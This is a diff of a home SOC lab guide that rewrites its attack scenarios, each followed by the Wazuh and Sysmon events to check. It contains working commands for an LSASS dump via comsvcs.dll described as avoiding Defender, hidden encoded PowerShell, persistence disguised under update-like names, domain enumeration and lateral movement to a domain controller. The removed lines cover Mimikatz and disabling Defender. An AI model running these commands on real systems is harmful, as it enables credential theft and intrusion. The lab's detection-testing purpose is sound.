@@ -488,6 +488,19 @@ Executed from KALI (192.168.100.30) against DC01 (192.168.100.10) and WIN11 (192
 
 ---
 
+### Attack Chain Overview
+
+```
+KALI (192.168.100.30)
+    │
+    │ xfreerdp (RDP / port 3389)
+    ▼
+WIN11 (192.168.100.20)  ← Foothold established
+    │
+    │ Lateral movement
+    ▼
+DC01 (192.168.100.10)  ← Target
+
 ### 1. Nmap Scans
 
 **Discovery scan** across the whole lab subnet:
@@ -526,128 +539,255 @@ nxc smb 192.168.100.20 -u users.txt -p passwords.txt
 
 ### 3. Successful Login
 
-Once you know (or set) a valid credential pair, connect via Evil-WinRM to confirm access:
+If you have not done so, you may want to install an RDP session. Evil-WINRM did not work for me as I was unable to download some pre-requisites. Run this to install XfreeRDP:
+
+- sudo apt install -y freerdp2-x11
+
+Once you know (or set) a valid credential pair, connect via xfreerdp to confirm access (below is a sample username and passord from the WIN11 machine):
 ```bash
-evil-winrm -i 192.168.100.20 -u John.Smith -p 'ChangeMe123!'
+xfreerdp /v:192.168.100.20 -u John.Smith -p 'ChangeMe123!'
 ```
-A successful connection drops you into a PowerShell-like shell on WIN11.
+You are now remoted in.
 
 **Verify in Wazuh:** Windows Security Event ID 4624 (successful logon) — note the Logon Type (3 = network, typical for WinRM) as a field you'll reference in Phase 9/11.
 
 ---
 
-### 4. Encoded PowerShell
+### Scenario 4 — Encoded PowerShell Execution
 
-From the Evil-WinRM session (or any elevated session on the target), run a base64-encoded command — this specifically tests visibility into obfuscated command lines:
-```powershell
-powershell.exe -enc <base64string>
-```
-To generate a harmless test payload from Kali or any PowerShell prompt:
-```powershell
-[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
-```
-Paste the resulting string in place of `<base64string>` above.
+Run this inside a **PowerShell (Admin)** window on WIN11 via the RDP session.
 
-**Verify in Wazuh:** Sysmon Event ID 1 (process creation) where `CommandLine` contains `-enc` or `-EncodedCommand`. This is one of the highest-value detections in the whole lab — encoded PowerShell is a very common real-world obfuscation technique.
+**Generate a base64-encoded command:**
+```powershell
+$command = 'whoami; hostname; ipconfig'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encoded = [Convert]::ToBase64String($bytes)
+Write-Host $encoded
+```
+
+**Execute the encoded command:**
+```powershell
+powershell.exe -NoProfile -EncodedCommand $encoded
+```
+
+**Try a few variations** to generate more diverse Sysmon events:
+```powershell
+# Encoded net user enumeration
+$cmd2 = 'net user /domain'
+$enc2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd2))
+powershell.exe -enc $enc2
+
+# Encoded process listing
+$cmd3 = 'Get-Process | Select-Object Name, Id'
+$enc3 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd3))
+powershell.exe -WindowStyle Hidden -EncodedCommand $enc3
+```
+
+**Verify in Wazuh:** Sysmon Event ID 1 (process creation) — filter for `CommandLine` containing `-enc` or `-EncodedCommand`. The `-WindowStyle Hidden` variant is particularly worth noting as a common real-world evasion flag.
+
+**MITRE:** T1059.001 — PowerShell
 
 ---
 
-### 5. Scheduled Task Persistence
+### Scenario 5 — Scheduled Task Persistence
 
-Create a scheduled task pointing at a benign binary, simulating a persistence mechanism:
+Still inside the WIN11 RDP session, PowerShell as Administrator:
+
+**Create the persistence task:**
 ```powershell
-schtasks /create /tn "UpdateCheck" /tr "C:\Windows\System32\calc.exe" /sc onlogon /ru SYSTEM
+schtasks /create /tn "WindowsUpdateHelper" /tr "C:\Windows\System32\calc.exe" /sc onlogon /ru SYSTEM /f
 ```
 
-**Verify in Wazuh:** Sysmon Event ID 1 (process creation) for `schtasks.exe`, and Windows Security Event ID 4698 (a scheduled task was created) — the latter requires "Audit Other Object Access Events" to be enabled in the domain's audit policy if it isn't already; check Group Policy / local security policy on DC01 if 4698 doesn't appear.
+**Verify it was created:**
+```powershell
+schtasks /query /tn "WindowsUpdateHelper" /fo LIST
+```
+
+**Also add a registry run key** (second persistence technique, one step):
+```powershell
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateHelper" -Value "C:\Windows\System32\calc.exe"
+```
+
+**Verify the registry key:**
+```powershell
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+```
+
+**Clean up both after verifying Wazuh caught them:**
+```powershell
+schtasks /delete /tn "WindowsUpdateHelper" /f
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateHelper"
+```
+
+**Verify in Wazuh:**
+- Sysmon Event ID 1 for `schtasks.exe`
+- Windows Security Event ID 4698 (scheduled task created)
+- Sysmon Event ID 13 (RegistryEvent) for the Run key write
+
+**MITRE:** T1053.005 (Scheduled Task), T1547.001 (Registry Run Key)
 
 ---
 
-### 6. Credential Dumping (Mimikatz)
+### Scenario 6 — Credential Dumping (No Mimikatz / Defender-Safe)
 
-**Download** the latest release directly on the Windows target (WIN11 or DC01):
-```
-https://github.com/gentilkiwi/mimikatz/releases/latest
-```
-Grab the zip asset, extract it — you'll get `Win32` and `x64` folders.
+This method uses a **built-in Windows DLL** (`comsvcs.dll`) to dump LSASS memory — no third-party tool download needed, much less likely to be flagged by Defender than Mimikatz.
 
-**Before running it:** Windows Defender will almost certainly flag and quarantine Mimikatz on sight — it's one of the most heavily signatured tools that exists. Since the goal here is to observe *Sysmon's* detection of LSASS access (not to test AV evasion), temporarily disable real-time protection for this test:
+**Step 1 — Find the LSASS process ID:**
 ```powershell
-Set-MpPreference -DisableRealtimeMonitoring $true
+Get-Process lsass
 ```
-Remember to re-enable it afterward:
+Note the `Id` value from the output (e.g. `784`).
+
+**Step 2 — Dump LSASS memory using comsvcs.dll:**
 ```powershell
-Set-MpPreference -DisableRealtimeMonitoring $false
+$pid = (Get-Process lsass).Id
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $pid C:\Windows\Temp\lsass.dmp full
 ```
 
-**Run it** from an elevated prompt:
+**Step 3 — Confirm the dump file was created:**
 ```powershell
-cd C:\Path\To\mimikatz\x64
-.\mimikatz.exe
+dir C:\Windows\Temp\lsass.dmp
 ```
-Inside the Mimikatz console:
-```
-privilege::debug
-sekurlsa::logonpasswords
-```
-`privilege::debug` should return `OK` — if it doesn't, you're not running elevated. `sekurlsa::logonpasswords` dumps credentials of logged-on users from LSASS memory.
 
-**Verify in Wazuh:** Sysmon Event ID 10 (ProcessAccess) where `TargetImage` contains `lsass.exe` — this is the core detection for this entire technique, and one of the most important ones in the lab.
+> **Note:** This dump file would then be copied back to Kali for offline analysis with tools like Mimikatz or pypykatz. For this lab, creating the file and confirming Sysmon caught the LSASS access is the goal — you don't need to actually parse the dump.
+
+**Optional — GUI method via Task Manager (since you have RDP):**
+Inside the RDP session, open Task Manager → Details tab → right-click `lsass.exe` → Create dump file. Produces the same Sysmon signal with zero command-line footprint — worth doing as a comparison.
+
+**Verify in Wazuh:**
+- Sysmon Event ID 10 (ProcessAccess) where `TargetImage` contains `lsass.exe` — this is the primary detection signal
+- Sysmon Event ID 11 (FileCreate) for the `.dmp` file creation
+
+**MITRE:** T1003.001 — LSASS Memory
 
 ---
 
-### 7. Lateral Movement
+### Scenario 7 — Domain Enumeration (Pre-Lateral Movement Recon)
 
-**Using Evil-WinRM** to pivot from Kali directly to another host with captured/known credentials:
-```bash
-evil-winrm -i 192.168.100.10 -u ITAdmin -p 'ChangeMe123!'
+Before moving to DC01, enumerate the domain from WIN11 — this is realistic attacker behavior and generates its own set of detection signals:
+
+```powershell
+# Domain info
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# All domain users
+net user /domain
+
+# Domain admins specifically
+net group "Domain Admins" /domain
+
+# Domain computers
+net view /domain:SOCLAB
+
+# Logged-on users and sessions
+qwinsta
+query user
 ```
 
-**Using Impacket's psexec.py** for a more classic lateral-movement technique (creates and runs a service remotely):
-```bash
-psexec.py SOCLAB/ITAdmin:'ChangeMe123!'@192.168.100.10
-```
+**Verify in Wazuh:** Sysmon Event ID 1 for `net.exe` calls, Windows Security Event ID 4661 (object handle requested) for directory service queries.
 
-**Verify in Wazuh:** for PsExec-style movement, look for Windows Security Event ID 7045 (a new service was installed) and Sysmon Event ID 1 for the resulting spawned process — psexec-style tools have a distinctive parent/child signature worth noting for Phase 9.
+**MITRE:** T1087.002 (Domain Account Discovery), T1018 (Remote System Discovery)
 
 ---
 
-### 8. Atomic Red Team Simulations
+### Scenario 8 — Lateral Movement (WIN11 → DC01)
 
-Run these **on the Windows target itself** (installed back in Phase 7's Kali setup note — actually installed on DC01/WIN11, not Kali):
+Using credentials gathered earlier (or your known ITAdmin creds) to move from WIN11 to DC01 using **built-in Windows tools** — no extra tools needed.
+
+**Method A — PowerShell Remoting (Enter-PSSession):**
+```powershell
+$cred = Get-Credential    # enter SOCLAB\ITAdmin and password when prompted
+Enter-PSSession -ComputerName DC01 -Credential $cred
+```
+You'll get an interactive PowerShell session on DC01. Run a few commands to prove access:
+```powershell
+whoami
+hostname
+Get-ADUser -Filter * | Select Name    # lists all AD users from the DC
+```
+Exit when done:
+```powershell
+Exit-PSSession
+```
+
+**Method B — Remote command without interactive session:**
+```powershell
+$cred = Get-Credential
+Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock {
+    whoami
+    hostname
+    ipconfig
+}
+```
+
+**Method C — Map a network share (SMB lateral movement):**
+```powershell
+net use \\192.168.100.10\C$ /user:SOCLAB\ITAdmin YourPassword
+dir \\192.168.100.10\C$
+```
+
+**Verify in Wazuh on DC01:**
+- Windows Security Event ID 4624 (successful logon, Logon Type 3 for network)
+- Windows Security Event ID 4648 (logon using explicit credentials)
+- Sysmon Event ID 1 for any processes spawned remotely
+
+**MITRE:** T1021.006 (PowerShell Remoting), T1021.002 (SMB/Windows Admin Shares)
+
+---
+
+### Scenario 9 — Atomic Red Team Simulations
+
+Run from PowerShell (Admin) on WIN11 inside the RDP session:
+
 ```powershell
 Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
 ```
 
-**Credential dumping technique** (maps directly to the Mimikatz scenario above, useful as a second data point):
+**Run individual technique tests:**
 ```powershell
+# T1003.001 - LSASS credential dumping
 Invoke-AtomicTest T1003.001
-```
 
-**Scheduled task technique** (second data point for scenario 5 above):
-```powershell
+# T1053.005 - Scheduled task persistence
 Invoke-AtomicTest T1053.005
+
+# T1059.001 - PowerShell execution
+Invoke-AtomicTest T1059.001
+
+# T1087.002 - Domain account discovery
+Invoke-AtomicTest T1087.002
 ```
 
-Running the same technique two ways (manually, and via Atomic Red Team) is a good way to confirm your detection isn't accidentally keyed to something incidental about one specific tool's behavior.
+**Check prerequisites before running** (some tests need specific tools/conditions):
+```powershell
+Invoke-AtomicTest T1003.001 -CheckPrereqs
+```
 
-**Verify in Wazuh:** same event IDs as the corresponding manual scenario above — confirm both trigger identically.
+**Clean up after each test:**
+```powershell
+Invoke-AtomicTest T1003.001 -Cleanup
+Invoke-AtomicTest T1053.005 -Cleanup
+```
+
+**Verify in Wazuh:** same Event IDs as the corresponding manual scenarios above — running both confirms your detections aren't tied to one specific tool's behavior.
 
 ---
 
-### MITRE ATT&CK Reference Table
+### Full MITRE ATT&CK Reference
 
-Useful to carry forward into Phase 10 (Detection Engineering) and Phase 11 (Incident Response documentation) so every scenario has its technique ID ready to go.
-
-| Scenario | Technique ID | Tactic |
-|---|---|---|
-| Nmap scans | T1046 | Discovery |
-| Password spraying | T1110.003 | Credential Access |
-| Successful login | T1078 | Initial Access / Persistence |
-| Encoded PowerShell | T1059.001 | Execution |
-| Scheduled task persistence | T1053.005 | Persistence |
-| Credential dumping (Mimikatz) | T1003.001 | Credential Access |
-| Lateral movement (PsExec/Evil-WinRM) | T1021.002 / T1021.006 | Lateral Movement |
+| # | Scenario | Tool | Technique ID | Tactic |
+|---|---|---|---|---|
+| 1 | Network scan | nmap | T1046 | Discovery |
+| 2 | Password spray | nxc smb | T1110.003 | Credential Access |
+| 3 | RDP foothold | xfreerdp | T1021.001 | Lateral Movement |
+| 4 | Encoded PowerShell | powershell -enc | T1059.001 | Execution |
+| 5a | Scheduled task | schtasks | T1053.005 | Persistence |
+| 5b | Registry run key | Set-ItemProperty | T1547.001 | Persistence |
+| 6 | LSASS dump | comsvcs.dll | T1003.001 | Credential Access |
+| 7 | Domain enumeration | net.exe / ADSI | T1087.002 | Discovery |
+| 8a | Lateral movement | Enter-PSSession | T1021.006 | Lateral Movement |
+| 8b | Lateral movement | net use | T1021.002 | Lateral Movement |
+| 9 | Simulations | Atomic Red Team | Various | Various |
 
 ---
 
@@ -655,12 +795,11 @@ Useful to carry forward into Phase 10 (Detection Engineering) and Phase 11 (Inci
 
 | Symptom | Likely Cause / Fix |
 |---|---|
-| Hydra returns nothing / all failures against WinRM | Confirm WinRM is enabled on the target: `Enable-PSRemoting -Force` (run once on WIN11/DC01) |
-| Evil-WinRM connects but immediately drops | Usually a WinRM auth type mismatch — confirm the account isn't locked out from the earlier spray |
-| Mimikatz binary disappears right after extraction | Defender quarantined it — check Windows Security → Protection history, restore, and disable real-time protection first next time |
-| `sekurlsa::logonpasswords` returns no passwords, only NTLM hashes | Expected on modern Windows with credential guard / WDigest disabled by default — this is realistic behavior, not a failure. NTLM hashes are still enough for pass-the-hash style follow-on techniques if you want to extend the lab |
-| psexec.py fails with "STATUS_ACCESS_DENIED" | Account used doesn't have local admin rights on the target — use ITAdmin (Domain Admin) rather than a standard user account |
-| Nothing shows up in Wazuh for any of these | Go back and confirm the Sysmon `<localfile>` block from Phase 6 is still present and the agent service was restarted after adding it |
+| `Enter-PSSession` fails with access denied | WinRM not enabled on DC01 — run `Enable-PSRemoting -Force` on DC01 |
+| comsvcs.dll dump creates empty file | Not running PowerShell as Administrator — reopen elevated |
+| Sysmon Event ID 10 not appearing in Wazuh for LSASS dump | Confirm the Sysmon `<localfile>` block is still in ossec.conf on WIN11 and the WazuhSvc was restarted after adding it |
+| Atomic Red Team import fails | Path may differ — run `dir C:\AtomicRedTeam` to confirm install location |
+| `net use` to DC01 fails | Confirm DC01 has File and Printer Sharing enabled and the Windows Firewall rule for it is active |
 
 ---
 
